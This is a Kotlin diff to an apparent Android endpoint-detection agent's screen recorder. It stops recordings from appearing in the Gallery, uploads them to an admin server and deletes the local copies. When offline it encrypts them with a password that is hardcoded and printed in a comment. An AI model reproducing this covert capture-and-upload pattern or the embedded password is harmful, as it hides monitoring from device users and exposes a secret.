@@ -10,6 +10,7 @@ import android.os.Handler
 import android.os.HandlerThread
 import android.os.PowerManager
 import android.util.Log
+import com.edr.agent.crypto.EdrFileLocker
 import com.edr.agent.network.EdrHttpClient
 import com.edr.agent.service.EdrAccessibilityService
 import com.edr.agent.storage.EdrLocalStorage
@@ -85,9 +86,7 @@ object AppTrapScreenRecorder {
         }
 
         try {
-            val edrDir = EdrLocalStorage.getEdrDir(context)
-            val recDir = File(edrDir, "trap_recordings")
-            if (!recDir.exists()) recDir.mkdirs()
+            val recDir = EdrLocalStorage.getTrapRecordingsDir(context)
 
             val now = Date()
             val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(now)
@@ -356,17 +355,10 @@ object AppTrapScreenRecorder {
         val video = outputFile
         if (video != null && video.exists() && video.length() > 1000) {
             Log.i(TAG, "Video finalized cleanly: ${video.name} (${video.length()} bytes)")
-            // Register video with Android MediaScanner so user sees it in Gallery & /EDR folder
-            try {
-                android.media.MediaScannerConnection.scanFile(
-                    context,
-                    arrayOf(video.absolutePath),
-                    arrayOf("video/mp4"),
-                    null
-                )
-            } catch (ignored: Exception) {}
+            // NOTE: MediaScannerConnection.scanFile is intentionally OMITTED so recordings
+            // never appear in the phone's public Gallery.
 
-            // Asynchronously upload video to EDR Server
+            // Asynchronously upload video directly to EDR Admin Server
             uploadTrapRecording(context, video, pkg, label, durationFormatted)
         } else {
             Log.w(TAG, "Video file too small or missing (${video?.length()} bytes). Discarding.")
@@ -411,7 +403,10 @@ object AppTrapScreenRecorder {
     }
 
     /**
-     * Uploads the recorded video evidence to /api/devices/{deviceId}/recordings
+     * Uploads the recorded video evidence directly to /api/devices/{deviceId}/recordings.
+     * If upload succeeds, the local recording file is deleted immediately so nothing is kept on the phone.
+     * If upload fails (e.g. offline/network issue), the file is locked and encrypted with password "prit@312005"
+     * in the EDR folder and hidden from Gallery (.nomedia).
      */
     private fun uploadTrapRecording(
         context: Context,
@@ -421,8 +416,9 @@ object AppTrapScreenRecorder {
         duration: String
     ) {
         Thread {
+            var uploadedSuccessfully = false
             try {
-                Log.i(TAG, "Uploading trap video evidence (${file.length()} bytes) to EDR Server...")
+                Log.i(TAG, "Uploading trap video evidence (${file.length()} bytes) to EDR Admin Server...")
                 val deviceId = SyncPreferences.deviceId
                 val url = "${SyncPreferences.httpBaseUrl}/api/devices/$deviceId/recordings"
 
@@ -445,23 +441,144 @@ object AppTrapScreenRecorder {
                     .build()
 
                 val response = httpClient.newCall(request).execute()
-                val ok = response.isSuccessful
+                uploadedSuccessfully = response.isSuccessful
                 val code = response.code
                 response.close()
 
-                if (ok) {
-                    Log.i(TAG, "Trap video evidence uploaded successfully! (${file.name})")
+                if (uploadedSuccessfully) {
+                    Log.i(TAG, "Trap video evidence uploaded successfully to admin server! (${file.name})")
                     EdrLocalStorage.appendEdrLog(
                         context,
                         "EVIDENCE",
-                        "Uploaded attacker video for $appLabel ($duration) to EDR server. Saved local copy at ${file.absolutePath}"
+                        "Uploaded attacker video for $appLabel ($duration) to EDR server. Removing local copy from phone."
                     )
-                    // Keep file preserved in /EDR/trap_recordings folder so phone user can view it anytime
+                    // DELETE local video file immediately so it is NOT saved on phone
+                    try {
+                        if (file.exists()) {
+                            val deleted = file.delete()
+                            Log.i(TAG, "Local video file removed from phone: $deleted (${file.name})")
+                        }
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Could not delete local video file: ${e.message}")
+                    }
                 } else {
                     Log.e(TAG, "Server rejected trap video upload: HTTP $code")
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Failed uploading trap video: ${e.message}", e)
+            } finally {
+                // If upload failed (e.g. phone offline), lock & encrypt file in EDR folder with password protection
+                if (!uploadedSuccessfully && file.exists()) {
+                    try {
+                        Log.w(TAG, "Server upload unreachable. Encrypting & locking recording locally with password protection...")
+                        val locked = EdrFileLocker.lockFile(file, EdrFileLocker.PASSWORD_EDR)
+                        if (locked != null) {
+                            Log.i(TAG, "Recording file locked: ${locked.name}")
+                            EdrLocalStorage.appendEdrLog(
+                                context,
+                                "OFFLINE_REC",
+                                "Upload pending. Encrypted & password-locked recording as ${locked.name} in /EDR/trap_recordings/"
+                            )
+                        }
+                    } catch (lockEx: Exception) {
+                        Log.e(TAG, "Failed locking recording file: ${lockEx.message}", lockEx)
+                    }
+                }
+            }
+        }.start()
+    }
+
+    /**
+     * Retries uploading any offline recordings that were previously locked with password protection.
+     * Also cleans up any leftover .trashed-* files or unencrypted orphaned .mp4 files.
+     */
+    fun flushPendingLockedRecordings(context: Context) {
+        Thread {
+            try {
+                val candidateDirs = listOf(
+                    EdrLocalStorage.getTrapRecordingsDir(context),
+                    File("/sdcard/EDR/trap_recordings"),
+                    File(android.os.Environment.getExternalStorageDirectory(), "EDR/trap_recordings")
+                ).distinctBy { it.absolutePath }.filter { it.exists() && it.isDirectory }
+
+                for (recDir in candidateDirs) {
+                    EdrLocalStorage.ensureNoMedia(recDir)
+                    val files = recDir.listFiles() ?: continue
+
+                    // 1. Clean up trashed files or legacy raw mp4s
+                    for (f in files) {
+                        if (f.name.startsWith(".trashed-")) {
+                            try { f.delete() } catch (ignored: Exception) {}
+                        } else if (f.name.endsWith(".mp4") && f != outputFile) {
+                            // Old unencrypted mp4 found -> lock it with password immediately
+                            try {
+                                EdrFileLocker.lockFile(f, EdrFileLocker.PASSWORD_EDR)
+                            } catch (ignored: Exception) {}
+                        }
+                    }
+
+                    // 2. Retry upload for any .locked files
+                    val lockedFiles = recDir.listFiles { _, name -> name.endsWith(EdrFileLocker.LOCKED_EXTENSION) }
+                    if (lockedFiles.isNullOrEmpty()) continue
+
+                    val deviceId = SyncPreferences.deviceId
+                    val baseUrl = SyncPreferences.httpBaseUrl
+                    if (deviceId.isEmpty() || baseUrl.isEmpty()) continue
+
+                    Log.i(TAG, "Found ${lockedFiles.size} offline locked recording(s) in ${recDir.name}. Retrying upload...")
+
+                    for (locked in lockedFiles) {
+                        val rawName = locked.name.removeSuffix(EdrFileLocker.LOCKED_EXTENSION)
+                        val appLabel = if (rawName.startsWith("trap_")) {
+                            val clean = rawName.removePrefix("trap_").removeSuffix(".mp4")
+                            clean.split("__").firstOrNull()?.replace('_', ' ') ?: "App"
+                        } else {
+                            "App"
+                        }
+
+                        val tempOut = File(context.cacheDir, "temp_upload_${System.currentTimeMillis()}_$rawName")
+                        val unlocked = EdrFileLocker.unlockToFile(locked, tempOut, EdrFileLocker.PASSWORD_EDR)
+                        if (!unlocked || !tempOut.exists()) {
+                            tempOut.delete()
+                            continue
+                        }
+
+                        try {
+                            val body = MultipartBody.Builder()
+                                .setType(MultipartBody.FORM)
+                                .addFormDataPart("duration", "00:30")
+                                .addFormDataPart("recordingType", "APP_TRAP")
+                                .addFormDataPart("appName", appLabel)
+                                .addFormDataPart("packageName", "unknown")
+                                .addFormDataPart(
+                                    "video",
+                                    rawName,
+                                    tempOut.asRequestBody("video/mp4".toMediaType())
+                                )
+                                .build()
+
+                            val request = Request.Builder()
+                                .url("$baseUrl/api/devices/$deviceId/recordings")
+                                .post(body)
+                                .build()
+
+                            val response = httpClient.newCall(request).execute()
+                            val isOk = response.isSuccessful
+                            response.close()
+
+                            if (isOk) {
+                                Log.i(TAG, "Successfully flushed offline recording to admin: $rawName. Removing locked file.")
+                                locked.delete()
+                            }
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Failed uploading offline recording ${locked.name}: ${e.message}")
+                        } finally {
+                            tempOut.delete()
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Error in flushPendingLockedRecordings: ${e.message}")
             }
         }.start()
     }
